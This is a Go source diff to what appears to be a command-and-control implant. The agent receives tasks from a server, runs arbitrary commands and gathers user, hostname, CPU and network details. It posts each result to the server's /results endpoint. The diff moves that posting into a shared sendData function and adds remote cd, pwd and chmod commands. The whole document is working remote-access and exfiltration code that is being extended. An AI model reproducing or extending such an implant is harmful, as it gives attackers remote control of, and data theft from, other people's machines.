@@ -101,6 +101,13 @@ func processTask(task string) {
 		getSysinfo()
 	} else if task == "netinfo" {
 		netInfo()
+	} else if strings.HasPrefix(task, "cd") {
+		changeDir(strings.Fields(task)[1])
+	} else if task == "pwd" {
+		wd, _ := os.Getwd()
+		sendData(string(wd))
+	} else if strings.HasPrefix(task, "chmod") {
+		changePerms(strings.Fields(task)[1:])
 	} else if strings.HasPrefix(task, "exec") {
 		if len(strings.Fields(task)) < 2 {
 			return
@@ -109,21 +116,24 @@ func processTask(task string) {
 	}
 }
 
-func getUID(id string) {
-	hostname, _ = os.Hostname()
-	test, _ := user.Current()
-	username = test.Username
-	uid := username + "@" + hostname
+func sendData(output string) {
 	data := url.Values{
 		"id":     {id},
-		"output": {uid},
+		"output": {output},
 	}
-	fmt.Println("Sending data: " + uid)
 	resp, err := http.PostForm(server+"/results", data)
 	if err != nil {
 		return
 	}
 	defer resp.Body.Close()
+}
+
+func getUID(id string) {
+	hostname, _ = os.Hostname()
+	test, _ := user.Current()
+	username = test.Username
+	output := username + "@" + hostname
+	sendData(output)
 }
 
 func adjustSleep(time string) {
@@ -140,17 +150,7 @@ func adjustSleep(time string) {
 func getSysinfo() {
 	cpus := runtime.NumCPU()
 	output := "Num CPUs: " + fmt.Sprint(cpus)
-	data := url.Values{
-		"id":     {id},
-		"output": {output},
-	}
-	fmt.Println("Sending data: " + output)
-	resp, err := http.PostForm(server+"/results", data)
-	if err != nil {
-		return
-	}
-	defer resp.Body.Close()
-
+	sendData(output)
 }
 
 func execute(command []string) {
@@ -164,16 +164,7 @@ func execute(command []string) {
 	if err != nil {
 		fmt.Println(err)
 	}
-	data := url.Values{
-		"id":     {id},
-		"output": {outb.String()},
-	}
-	fmt.Println("Sending output:", outb.String())
-	resp, err := http.PostForm(server+"/results", data)
-	if err != nil {
-		return
-	}
-	defer resp.Body.Close()
+	sendData(outb.String())
 }
 
 func netInfo() {
@@ -196,13 +187,37 @@ func netInfo() {
 	for key, value := range interfaceInfo {
 		fmt.Fprintf(b, "%s : %s\n", key, value)
 	}
-	data := url.Values{
-		"id":     {id},
-		"output": {b.String()},
+	sendData(b.String())
+
+}
+
+func changeDir(dir string) {
+	var output string
+	//currentDir, err := os.Getwd()
+	err := os.Chdir(dir)
+	if err != nil {
+		output = "Path does not exist!"
 	}
-	resp, err := http.PostForm(server+"/results", data)
+	currentDir, err := os.Getwd()
 	if err != nil {
 		return
 	}
-	defer resp.Body.Close()
+
+	output = "Dir set to: " + string(currentDir)
+	sendData(output)
+}
+
+func changePerms(args []string) {
+	mode, err := strconv.ParseUint(args[0], 8, 32)
+	if err != nil {
+		return
+	}
+	for _, file := range args[1:] {
+		err = os.Chmod(file, os.FileMode(mode))
+		if err != nil {
+			continue
+		}
+	}
+	output := "Done!"
+	sendData(output)
 }
